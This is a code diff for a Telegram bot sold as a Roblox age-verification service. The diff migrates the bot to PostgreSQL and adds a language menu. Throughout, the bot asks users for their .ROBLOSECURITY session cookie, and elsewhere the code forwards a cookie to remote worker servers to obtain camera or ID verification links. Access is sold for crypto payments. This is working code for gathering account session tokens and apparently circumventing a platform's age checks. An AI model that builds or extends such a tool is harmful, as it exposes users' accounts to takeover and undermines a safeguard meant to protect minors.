@@ -2,7 +2,6 @@
 import os
 import re
 import logging
-import sqlite3
 import requests
 import asyncio
 import time as _time
@@ -13,10 +12,11 @@ from telegram.ext import (
     CallbackQueryHandler, filters, ContextTypes, ConversationHandler
 )
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 
 BOT_TOKEN        = os.environ.get("BOT_TOKEN")
 CRYPTO_BOT_TOKEN = os.environ.get("CRYPTO_BOT_TOKEN", "")
+DATABASE_URL     = os.environ.get("DATABASE_URL", "")  # PostgreSQL URL для Railway
 
 _WORKER_URLS = [
     u.strip() for u in [
@@ -66,9 +66,7 @@ def call_worker_2fa(cookie: str, method: str) -> str | None:
     order = get_worker_order()
     if not order:
         return get_url_via_api_2fa(cookie, method)
-
-    last_error = None
-    for i, worker_url in enumerate(order):
+    for worker_url in order:
         try:
             r = requests.post(
                 f"{worker_url}/get-link",
@@ -77,137 +75,167 @@ def call_worker_2fa(cookie: str, method: str) -> str | None:
                 timeout=620,
             )
             if r.status_code == 200:
-                link = r.json().get("link")
                 _mark_worker(worker_url, True)
-                return link
-            last_error = f"http_{r.status_code}"
+                return r.json().get("link")
             continue
         except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
             _mark_worker(worker_url, False)
-            last_error = "unreachable"
             continue
-        except Exception as e:
-            last_error = str(e)
+        except Exception:
             continue
     return None
 
-ADMIN_IDS = set(map(int, os.environ.get("ADMIN_IDS", "0").split(",")))
+ADMIN_IDS      = set(map(int, os.environ.get("ADMIN_IDS", "0").split(",")))
 LOG_CHANNEL_ID = os.environ.get("LOG_CHANNEL_ID", "")
 
 executor = ThreadPoolExecutor(max_workers=20)
 pending_payments = {}
 
-WAITING_MENU = 1
-WAITING_COOKIE = 2
-WAITING_BUY = 3
-WAITING_PAYMENT = 4
-WAITING_PROMO = 5
-WAITING_ADMIN = 6
-WAITING_ADMIN_BROADCAST = 7
-WAITING_ADMIN_ADD_BALANCE = 8
+WAITING_LANG                   = 0
+WAITING_MENU                   = 1
+WAITING_COOKIE                 = 2
+WAITING_BUY                    = 3
+WAITING_PAYMENT                = 4
+WAITING_PROMO                  = 5
+WAITING_ADMIN                  = 6
+WAITING_ADMIN_BROADCAST        = 7
+WAITING_ADMIN_ADD_BALANCE      = 8
 WAITING_ADMIN_ADD_BALANCE_AMOUNT = 9
-WAITING_ADMIN_CREATE_PROMO = 10
-WAITING_ADMIN_ADD_SUB = 11
-WAITING_ADMIN_REMOVE_BALANCE = 12
+WAITING_ADMIN_CREATE_PROMO     = 10
+WAITING_ADMIN_ADD_SUB          = 11
+WAITING_ADMIN_REMOVE_BALANCE   = 12
 WAITING_ADMIN_REMOVE_BALANCE_AMOUNT = 13
 
-PRICE_2FA = 1.00
+PRICE_2FA    = 1.00
 DISCOUNTS_2FA = {5: 0.05, 10: 0.10, 15: 0.15, 25: 0.20}
 SUBSCRIPTIONS = {1: 3.00, 3: 5.00, 7: 10.00, 30: 25.00, 0: 50.00}
-DB_PATH = "bot_data.db"
+
+# ─────────────────────────── DATABASE ───────────────────────────
+
+import psycopg2
+import psycopg2.extras
+from contextlib import contextmanager
+
+@contextmanager
+def _db():
+    conn = psycopg2.connect(DATABASE_URL)
+    try:
+        yield conn
+        conn.commit()
+    except Exception:
+        conn.rollback()
+        raise
+    finally:
+        conn.close()
 
 def db_init():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, attempts INTEGER DEFAULT 0, spent REAL DEFAULT 0.0, lang TEXT DEFAULT 'ru')")
-    c.execute("CREATE TABLE IF NOT EXISTS promo_codes (code TEXT PRIMARY KEY, attempts INTEGER DEFAULT 1, uses INTEGER DEFAULT 0, max_uses INTEGER DEFAULT 1)")
-    c.execute("CREATE TABLE IF NOT EXISTS used_promos (user_id INTEGER, code TEXT, PRIMARY KEY (user_id, code))")
-    c.execute("CREATE TABLE IF NOT EXISTS subscriptions (user_id INTEGER PRIMARY KEY, expires_at TEXT, is_forever INTEGER DEFAULT 0)")
-    conn.commit()
-    conn.close()
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("""
+            CREATE TABLE IF NOT EXISTS users (
+                user_id BIGINT PRIMARY KEY,
+                username TEXT,
+                attempts INTEGER DEFAULT 0,
+                spent REAL DEFAULT 0.0,
+                lang TEXT DEFAULT 'ru'
+            )
+        """)
+        c.execute("""
+            CREATE TABLE IF NOT EXISTS promo_codes (
+                code TEXT PRIMARY KEY,
+                attempts INTEGER DEFAULT 1,
+                uses INTEGER DEFAULT 0,
+                max_uses INTEGER DEFAULT 1
+            )
+        """)
+        c.execute("""
+            CREATE TABLE IF NOT EXISTS used_promos (
+                user_id BIGINT,
+                code TEXT,
+                PRIMARY KEY (user_id, code)
+            )
+        """)
+        c.execute("""
+            CREATE TABLE IF NOT EXISTS subscriptions (
+                user_id BIGINT PRIMARY KEY,
+                expires_at TEXT,
+                is_forever INTEGER DEFAULT 0
+            )
+        """)
 
 def db_get_user(user_id):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT username, attempts, spent FROM users WHERE user_id=?", (user_id,))
-    row = c.fetchone()
-    conn.close()
-    return row
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("SELECT username, attempts, spent FROM users WHERE user_id=%s", (user_id,))
+        return c.fetchone()
 
 def db_upsert_user(user_id, username, attempts_delta=0, spent_delta=0.0):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("""
-        INSERT INTO users (user_id, username, attempts, spent) VALUES (?, ?, ?, ?)
-        ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, attempts=attempts + ?, spent=spent + ?
-    """, (user_id, username, max(0, attempts_delta), spent_delta, attempts_delta, spent_delta))
-    conn.commit()
-    conn.close()
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("""
+            INSERT INTO users (user_id, username, attempts, spent)
+            VALUES (%s, %s, %s, %s)
+            ON CONFLICT (user_id) DO UPDATE
+            SET username=EXCLUDED.username,
+                attempts=users.attempts + %s,
+                spent=users.spent + %s
+        """, (user_id, username, max(0, attempts_delta), spent_delta, attempts_delta, spent_delta))
 
 def db_get_attempts(user_id):
     row = db_get_user(user_id)
     return row[1] if row else 0
 
 def db_get_all_users():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT user_id, username, attempts, spent FROM users ORDER BY spent DESC")
-    rows = c.fetchall()
-    conn.close()
-    return rows
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("SELECT user_id, username, attempts, spent FROM users ORDER BY spent DESC")
+        return c.fetchall()
 
 def db_get_top(limit=10):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT user_id, username, spent FROM users WHERE spent > 0 ORDER BY spent DESC LIMIT ?", (limit,))
-    rows = c.fetchall()
-    conn.close()
-    return rows
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("SELECT user_id, username, spent FROM users WHERE spent > 0 ORDER BY spent DESC LIMIT %s", (limit,))
+        return c.fetchall()
 
 def db_create_promo(code, attempts, max_uses):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO promo_codes (code, attempts, uses, max_uses) VALUES (?, ?, 0, ?)", (code, attempts, max_uses))
-    conn.commit()
-    conn.close()
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("""
+            INSERT INTO promo_codes (code, attempts, uses, max_uses)
+            VALUES (%s, %s, 0, %s)
+            ON CONFLICT (code) DO UPDATE
+            SET attempts=EXCLUDED.attempts, max_uses=EXCLUDED.max_uses, uses=0
+        """, (code, attempts, max_uses))
 
 def db_use_promo(user_id, code):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT attempts, uses, max_uses FROM promo_codes WHERE code=?", (code,))
-    row = c.fetchone()
-    if not row:
-        conn.close()
-        return False, "Промокод не найден!", 0
-    attempts, uses, max_uses = row
-    if uses >= max_uses:
-        conn.close()
-        return False, "Промокод уже использован!", 0
-    c.execute("SELECT 1 FROM used_promos WHERE user_id=? AND code=?", (user_id, code))
-    if c.fetchone():
-        conn.close()
-        return False, "Вы уже использовали этот промокод!", 0
-    c.execute("UPDATE promo_codes SET uses=uses+1 WHERE code=?", (code,))
-    c.execute("INSERT INTO used_promos (user_id, code) VALUES (?, ?)", (user_id, code))
-    conn.commit()
-    conn.close()
-    return True, "OK", attempts
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("SELECT attempts, uses, max_uses FROM promo_codes WHERE code=%s", (code,))
+        row = c.fetchone()
+        if not row:
+            return False, "not_found", 0
+        attempts, uses, max_uses = row
+        if uses >= max_uses:
+            return False, "used", 0
+        c.execute("SELECT 1 FROM used_promos WHERE user_id=%s AND code=%s", (user_id, code))
+        if c.fetchone():
+            return False, "used_by_you", 0
+        c.execute("UPDATE promo_codes SET uses=uses+1 WHERE code=%s", (code,))
+        c.execute("INSERT INTO used_promos (user_id, code) VALUES (%s, %s)", (user_id, code))
+        return True, "ok", attempts
 
 def db_get_all_promos():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT code, attempts, uses, max_uses FROM promo_codes")
-    rows = c.fetchall()
-    conn.close()
-    return rows
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("SELECT code, attempts, uses, max_uses FROM promo_codes")
+        return c.fetchall()
 
 def db_get_subscription(user_id):
     import datetime
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT expires_at, is_forever FROM subscriptions WHERE user_id=?", (user_id,))
-    row = c.fetchone()
-    conn.close()
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("SELECT expires_at, is_forever FROM subscriptions WHERE user_id=%s", (user_id,))
+        row = c.fetchone()
     if not row:
         return False, None, False
     expires_at_str, is_forever = row
@@ -224,40 +252,51 @@ def db_get_subscription(user_id):
 
 def db_set_subscription(user_id, days):
     import datetime
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    if days == 0:
-        c.execute("INSERT INTO subscriptions (user_id, expires_at, is_forever) VALUES (?, NULL, 1) ON CONFLICT(user_id) DO UPDATE SET expires_at=NULL, is_forever=1", (user_id,))
-    else:
-        c.execute("SELECT expires_at, is_forever FROM subscriptions WHERE user_id=?", (user_id,))
-        existing = c.fetchone()
-        now = datetime.datetime.utcnow()
-        if existing and not existing[1] and existing[0]:
-            try:
-                exp = datetime.datetime.fromisoformat(existing[0])
-                if exp > now:
-                    now = exp
-            except Exception:
-                pass
-        new_exp = (now + datetime.timedelta(days=days)).isoformat()
-        c.execute("INSERT INTO subscriptions (user_id, expires_at, is_forever) VALUES (?, ?, 0) ON CONFLICT(user_id) DO UPDATE SET expires_at=?, is_forever=0", (user_id, new_exp, new_exp))
-    conn.commit()
-    conn.close()
+    with _db() as conn:
+        c = conn.cursor()
+        if days == 0:
+            c.execute("""
+                INSERT INTO subscriptions (user_id, expires_at, is_forever)
+                VALUES (%s, NULL, 1)
+                ON CONFLICT (user_id) DO UPDATE SET expires_at=NULL, is_forever=1
+            """, (user_id,))
+        else:
+            c.execute("SELECT expires_at, is_forever FROM subscriptions WHERE user_id=%s", (user_id,))
+            existing = c.fetchone()
+            now = datetime.datetime.utcnow()
+            if existing and not existing[1] and existing[0]:
+                try:
+                    exp = datetime.datetime.fromisoformat(existing[0])
+                    if exp > now:
+                        now = exp
+                except Exception:
+                    pass
+            new_exp = (now + datetime.timedelta(days=days)).isoformat()
+            c.execute("""
+                INSERT INTO subscriptions (user_id, expires_at, is_forever)
+                VALUES (%s, %s, 0)
+                ON CONFLICT (user_id) DO UPDATE SET expires_at=%s, is_forever=0
+            """, (user_id, new_exp, new_exp))
 
 def db_get_lang(user_id):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
-    row = c.fetchone()
-    conn.close()
-    return row[0] if row else "ru"
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("SELECT lang FROM users WHERE user_id=%s", (user_id,))
+        row = c.fetchone()
+    return row[0] if row else None  # None = новый пользователь, язык не выбран
 
 def db_set_lang(user_id, lang):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("UPDATE users SET lang=? WHERE user_id=?", (lang, user_id))
-    conn.commit()
-    conn.close()
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("UPDATE users SET lang=%s WHERE user_id=%s", (lang, user_id))
+
+def db_is_new_user(user_id) -> bool:
+    with _db() as conn:
+        c = conn.cursor()
+        c.execute("SELECT 1 FROM users WHERE user_id=%s", (user_id,))
+        return c.fetchone() is None
+
+# ─────────────────────────── TEXTS ───────────────────────────
 
 TEXTS = {
     "ru": {
@@ -322,6 +361,8 @@ TEXTS = {
         "btn_no_2fa": "🔓 Без 2FA",
         "btn_with_2fa": "🔐 С 2FA",
         "2fa_ask_cookie": "🔐 *Режим 2FA*\n\nОтправь `.ROBLOSECURITY` cookie",
+        "no2fa_ask_cookie": "🔓 *Режим БЕЗ 2FA*\n\nОтправь `.ROBLOSECURITY` cookie",
+        "choose_lang": "🌐 Выберите язык / Choose language:",
     },
     "en": {
         "main_menu_title": "*Roblox Age Verification Bot*",
@@ -385,15 +426,19 @@ TEXTS = {
         "btn_no_2fa": "🔓 Without 2FA",
         "btn_with_2fa": "🔐 With 2FA",
         "2fa_ask_cookie": "🔐 *2FA Mode*\n\nSend your `.ROBLOSECURITY` cookie",
+        "no2fa_ask_cookie": "🔓 *No 2FA Mode*\n\nSend your `.ROBLOSECURITY` cookie",
+        "choose_lang": "🌐 Выберите язык / Choose language:",
     }
 }
 
-def t(user_id, key, **kwargs):
-    lang = db_get_lang(user_id)
+def t(user_id, key, lang_override=None, **kwargs):
+    lang = lang_override or db_get_lang(user_id) or "ru"
     text = TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"].get(key, key))
     if kwargs:
         text = text.format(**kwargs)
     return text
+
+# ─────────────────────────── HELPERS ───────────────────────────
 
 def get_url_via_api(cookie, method):
     try:
@@ -466,19 +511,27 @@ def check_invoice(invoice_id):
     except Exception:
         return None
 
-async def send_log(bot, user_id, username, method, result, elapsed_sec, success, has_2fa=False):
-    if not LOG_CHANNEL_ID or not success:
+async def send_log(bot, user_id, username, method, elapsed_sec, has_2fa=False):
+    if not LOG_CHANNEL_ID:
         return
     try:
         cost = "$1.00" if has_2fa else "БЕСПЛАТНО"
         service = "Camera" if method == "camera" else "ID"
-        msg = f"✅ УСПЕШНО\n━━━━━━━━━━━━━━━━━━━━━━\n👤 ID: {user_id} (@{username})\n⚙️ Услуга: {service}\n✅ Результат: Ссылка получена\n⏲️ Время: {round(elapsed_sec)} сек\n💳 Сумма: {cost}"
+        msg = (
+            f"✅ УСПЕШНО\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 ID: {user_id} (@{username})\n"
+            f"⚙️ Услуга: {service}\n"
+            f"✅ Результат: Ссылка получена\n"
+            f"⏲️ Время: {round(elapsed_sec)} сек\n"
+            f"💳 Сумма: {cost}"
+        )
         await bot.send_message(chat_id=LOG_CHANNEL_ID, text=msg)
-    except Exception:
-        pass
+    except Exception as e:
+        logging.warning("send_log error: %s", e)
 
 def main_menu_kb(user_id=None):
-    lang = db_get_lang(user_id) if user_id else "ru"
+    lang = (db_get_lang(user_id) or "ru") if user_id else "ru"
     T = TEXTS[lang]
     buttons = [
         [InlineKeyboardButton(T["btn_get_link"], callback_data="get_link")],
@@ -494,7 +547,7 @@ def _sub_status_text(user_id):
     import datetime as _dt
     attempts = db_get_attempts(user_id)
     is_active, expires, is_forever = db_get_subscription(user_id)
-    lang = db_get_lang(user_id)
+    lang = db_get_lang(user_id) or "ru"
     if is_active and is_forever:
         return "∞", ("♾️ Forever" if lang == "en" else "♾️ Навсегда")
     elif is_active:
@@ -510,14 +563,55 @@ def _sub_status_text(user_id):
     else:
         return str(attempts), ("No sub" if lang == "en" else "Нет под.")
 
+def _lang_kb():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🇷🇺 Русский", callback_data="set_lang_ru"),
+         InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en")]
+    ])
+
+# ─────────────────────────── HANDLERS ───────────────────────────
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     tg = update.effective_user
-    db_upsert_user(user_id, tg.username or tg.first_name or "Аноним")
+    username = tg.username or tg.first_name or "Аноним"
+
+    is_new = db_is_new_user(user_id)
+
+    # Регистрируем пользователя (без языка для нового)
+    if is_new:
+        db_upsert_user(user_id, username)
+        # Просим выбрать язык
+        await update.message.reply_text(
+            "🌐 Выберите язык / Choose language:",
+            reply_markup=_lang_kb()
+        )
+        return WAITING_LANG
+
+    # Старый пользователь — сразу главное меню
+    db_upsert_user(user_id, username)
     attempts, sub_status = _sub_status_text(user_id)
     text = f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_sub')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}"
     await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
     return WAITING_MENU
+
+async def handle_set_lang(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка выбора языка (только при первом входе или через /lang)."""
+    query = update.callback_query
+    await query.answer()
+    user_id = update.effective_user.id
+    lang = "ru" if query.data == "set_lang_ru" else "en"
+    db_set_lang(user_id, lang)
+
+    attempts, sub_status = _sub_status_text(user_id)
+    text = f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_sub')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}"
+    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
+    return WAITING_MENU
+
+async def lang_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/lang — смена языка в любой момент."""
+    await update.message.reply_text("🌐 Выберите язык / Choose language:", reply_markup=_lang_kb())
+    return WAITING_LANG
 
 async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -527,6 +621,10 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = tg.username or tg.first_name or "Аноним"
     data = query.data
 
+    # Смена языка через главное меню
+    if data in ("set_lang_ru", "set_lang_en"):
+        return await handle_set_lang(update, context)
+
     if data == "main_menu":
         attempts, sub_status = _sub_status_text(user_id)
         text = f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_sub')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}"
@@ -534,7 +632,8 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return WAITING_MENU
 
     if data == "help":
-        await query.edit_message_text(t(user_id, "help_text"), parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
+        await query.edit_message_text(t(user_id, "help_text"), parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
         return WAITING_MENU
 
     if data == "top":
@@ -546,43 +645,48 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             for i, (uid, uname, spent) in enumerate(rows):
                 medal = medals[i] if i < 3 else f"{i+1}."
-                lines.append(f"{medal} {uname or t(user_id, 'anon')} - ${round(spent, 2)}")
-        await query.edit_message_text("\n".join(lines), parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
+                lines.append(f"{medal} {uname or '---'} — ${round(spent, 2)}")
+        await query.edit_message_text("\n".join(lines), parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
         return WAITING_MENU
 
     if data == "promo":
         context.user_data["waiting"] = "promo"
-        await query.edit_message_text(f"{t(user_id, 'promo_title')}\n\n{t(user_id, 'promo_enter')}", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
+        await query.edit_message_text(f"{t(user_id, 'promo_title')}\n\n{t(user_id, 'promo_enter')}", parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
         return WAITING_PROMO
 
     if data == "buy":
-        await query.edit_message_text(f"{t(user_id, 'buy_title')}\n\n{t(user_id, 'buy_price')}", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(t(user_id, "btn_buy_attempts"), callback_data="buy_attempts")],
-            [InlineKeyboardButton(t(user_id, "btn_buy_sub"), callback_data="buy_sub")],
-            [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")],
-        ]))
+        await query.edit_message_text(f"{t(user_id, 'buy_title')}\n\n{t(user_id, 'buy_price')}", parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(user_id, "btn_buy_attempts"), callback_data="buy_attempts")],
+                [InlineKeyboardButton(t(user_id, "btn_buy_sub"), callback_data="buy_sub")],
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")],
+            ]))
         return WAITING_BUY
 
     if data == "buy_attempts":
-        await query.edit_message_text("🎯 Выберите пакет попыток:", reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(t(user_id, "btn_buy_1"), callback_data="buy_1")],
-            [InlineKeyboardButton(t(user_id, "btn_buy_5"), callback_data="buy_5")],
-            [InlineKeyboardButton(t(user_id, "btn_buy_10"), callback_data="buy_10")],
-            [InlineKeyboardButton(t(user_id, "btn_buy_15"), callback_data="buy_15")],
-            [InlineKeyboardButton(t(user_id, "btn_buy_25"), callback_data="buy_25")],
-            [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
-        ]))
+        await query.edit_message_text("🎯 Выберите пакет попыток:" if (db_get_lang(user_id) or "ru") == "ru" else "🎯 Choose attempts package:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(user_id, "btn_buy_1"), callback_data="buy_1")],
+                [InlineKeyboardButton(t(user_id, "btn_buy_5"), callback_data="buy_5")],
+                [InlineKeyboardButton(t(user_id, "btn_buy_10"), callback_data="buy_10")],
+                [InlineKeyboardButton(t(user_id, "btn_buy_15"), callback_data="buy_15")],
+                [InlineKeyboardButton(t(user_id, "btn_buy_25"), callback_data="buy_25")],
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
+            ]))
         return WAITING_BUY
 
     if data == "buy_sub":
-        await query.edit_message_text("♾️ Выберите период подписки:", reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(t(user_id, "btn_sub_1d"), callback_data="sub_1")],
-            [InlineKeyboardButton(t(user_id, "btn_sub_3d"), callback_data="sub_3")],
-            [InlineKeyboardButton(t(user_id, "btn_sub_7d"), callback_data="sub_7")],
-            [InlineKeyboardButton(t(user_id, "btn_sub_30d"), callback_data="sub_30")],
-            [InlineKeyboardButton(t(user_id, "btn_sub_inf"), callback_data="sub_0")],
-            [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
-        ]))
+        await query.edit_message_text("♾️ Выберите период подписки:" if (db_get_lang(user_id) or "ru") == "ru" else "♾️ Choose subscription period:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(user_id, "btn_sub_1d"), callback_data="sub_1")],
+                [InlineKeyboardButton(t(user_id, "btn_sub_3d"), callback_data="sub_3")],
+                [InlineKeyboardButton(t(user_id, "btn_sub_7d"), callback_data="sub_7")],
+                [InlineKeyboardButton(t(user_id, "btn_sub_30d"), callback_data="sub_30")],
+                [InlineKeyboardButton(t(user_id, "btn_sub_inf"), callback_data="sub_0")],
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
+            ]))
         return WAITING_BUY
 
     if data.startswith("sub_") and data[4:].isdigit():
@@ -596,14 +700,15 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return WAITING_BUY
         inv_key = f"sub_{user_id}_{invoice['invoice_id']}"
         pending_payments[inv_key] = {"type": "sub", "days": days, "price": price, "desc": desc}
-        await query.edit_message_text(f"Счёт на подписку: {desc}\nСумма: ${price}", reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(t(user_id, "btn_pay"), url=invoice["pay_url"])],
-            [InlineKeyboardButton(t(user_id, "btn_check_pay"), callback_data=f"check_{inv_key}")],
-            [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy_sub")],
-        ]))
+        await query.edit_message_text(f"Счёт на подписку: {desc}\nСумма: ${price}",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(user_id, "btn_pay"), url=invoice["pay_url"])],
+                [InlineKeyboardButton(t(user_id, "btn_check_pay"), callback_data=f"check_{inv_key}")],
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy_sub")],
+            ]))
         return WAITING_PAYMENT
 
-    if data.startswith("buy_") and not data.startswith("buy_attempts") and not data.startswith("buy_sub"):
+    if data.startswith("buy_") and data not in ("buy_attempts", "buy_sub"):
         count = int(data.split("_")[1])
         discount = DISCOUNTS_2FA.get(count, 0)
         total = round(count * PRICE_2FA * (1 - discount), 2)
@@ -613,35 +718,38 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return WAITING_BUY
         inv_key = f"cb_{raw['invoice_id']}"
         pending_payments[inv_key] = {"user_id": user_id, "attempts": count, "total": total}
-        await query.edit_message_text(t(user_id, "invoice_created", amount=f"{total:.2f}", attempts=count), reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(t(user_id, "btn_pay"), url=raw["pay_url"])],
-            [InlineKeyboardButton(t(user_id, "btn_check_pay"), callback_data=f"check_{inv_key}")],
-            [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
-        ]))
+        await query.edit_message_text(t(user_id, "invoice_created", amount=f"{total:.2f}", attempts=count),
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(user_id, "btn_pay"), url=raw["pay_url"])],
+                [InlineKeyboardButton(t(user_id, "btn_check_pay"), callback_data=f"check_{inv_key}")],
+                [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="buy")],
+            ]))
         return WAITING_PAYMENT
 
     if data.startswith("check_"):
         inv_key = data[6:]
-        payment = pending_payments.get(inv_key, {})
         raw_id = "_".join(inv_key.split("_")[1:])
         inv = check_invoice(raw_id)
         if inv and inv.get("status") == "paid":
             payment = pending_payments.pop(inv_key, None)
-            if payment.get("type") == "sub":
+            if payment and payment.get("type") == "sub":
                 db_set_subscription(user_id, payment["days"])
                 db_upsert_user(user_id, username, spent_delta=payment["price"])
-                await query.edit_message_text(t(user_id, "sub_bought", desc=payment["desc"]), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
-            else:
+                await query.edit_message_text(t(user_id, "sub_bought", desc=payment["desc"]),
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
+            elif payment:
                 cnt = payment["attempts"]
                 db_upsert_user(user_id, username, attempts_delta=cnt, spent_delta=payment["total"])
-                await query.edit_message_text(t(user_id, "pay_ok", attempts=cnt, total=db_get_attempts(user_id)), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
+                await query.edit_message_text(t(user_id, "pay_ok", attempts=cnt, total=db_get_attempts(user_id)),
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
         else:
             await query.answer(t(user_id, "pay_pending"), show_alert=True)
         return WAITING_MENU
 
     if data == "get_link":
         await query.edit_message_text(t(user_id, "ask_2fa"), reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(t(user_id, "btn_no_2fa"), callback_data="2fa_no"), InlineKeyboardButton(t(user_id, "btn_with_2fa"), callback_data="2fa_yes")],
+            [InlineKeyboardButton(t(user_id, "btn_no_2fa"), callback_data="2fa_no"),
+             InlineKeyboardButton(t(user_id, "btn_with_2fa"), callback_data="2fa_yes")],
             [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")],
         ]))
         return WAITING_MENU
@@ -657,10 +765,12 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if data in ["choose_camera", "choose_id"]:
         context.user_data["method"] = "camera" if data == "choose_camera" else "id"
-        await query.edit_message_text(t(user_id, "2fa_ask_cookie"), parse_mode="Markdown")
+        has_2fa = context.user_data.get("has_2fa", False)
+        cookie_prompt_key = "2fa_ask_cookie" if has_2fa else "no2fa_ask_cookie"
+        await query.edit_message_text(t(user_id, cookie_prompt_key), parse_mode="Markdown")
         return WAITING_COOKIE
 
-    # ПОЛНАЯ АДМИН ПАНЕЛЬ
+    # ── ADMIN ──
     if data == "admin":
         if user_id not in ADMIN_IDS:
             return WAITING_MENU
@@ -672,7 +782,8 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
